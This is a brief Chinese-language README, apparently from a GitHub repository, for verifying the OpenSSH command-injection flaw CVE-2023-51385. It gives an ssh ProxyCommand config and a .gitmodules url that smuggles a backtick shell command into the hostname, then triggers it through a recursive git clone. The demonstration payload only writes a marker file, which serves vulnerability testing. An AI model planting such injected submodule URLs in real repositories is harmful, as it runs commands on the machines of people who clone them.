## 验证CVE-2023-51385

首先需要在`~/.ssh/config`中增加如下内容

```
host *.example.com
  ProxyCommand /usr/bin/nc -X connect -x 192.0.2.0:8080 %h %p
```

`.gitmodules`文件语句中存在命令注入

```
url = ssh://`echo helloworld > cve.txt`foo.example.com/bar
```

配置完成后,执行下面的指令触发

```
git clone https://github.com/LtmThink/CVE-2023-51385_test --recurse-submodules
```

如果成功执行将会在CVE-2023-51385_test目录下生成cve.txt文件

![image-20240317161540677](https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202403171617767.png)

注意:OpenSSH需要<9.6p1



详细信息见这篇博客:

https://vin01.github.io/piptagole/ssh/security/openssh/libssh/remote-code-execution/2023/12/20/openssh-proxycommand-libssh-rce.html

